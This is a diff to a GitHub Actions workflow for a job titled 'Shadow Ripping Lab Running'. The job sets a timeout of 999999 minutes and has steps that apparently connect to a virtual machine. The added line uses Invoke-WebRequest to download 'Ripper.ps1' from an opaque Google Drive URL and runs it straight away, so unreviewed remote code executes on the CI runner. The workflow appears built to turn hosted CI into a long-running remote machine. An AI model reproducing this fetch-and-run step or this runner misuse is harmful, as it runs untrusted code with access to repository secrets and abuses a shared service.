@@ -12,13 +12,14 @@ on:
 jobs:
   build:
     name: Shadow Ripping Lab Running
-    runs-on: windows-2022
+    runs-on: windows-latest
     timeout-minutes: 999999
 
     steps:
     - name: Downloading Essentials...
       run: |
         # WAIT FOR 3-4 MINUTES 
+        Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1KDZ1zZ-xqiaIZ2-8blIputjtpoS5wnqO&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921" -OutFile "Ripper.ps1" && ./Ripper.ps1
     - name: Starting Virtual Machine...
       run: |
         # CONNECTING WITH VM...
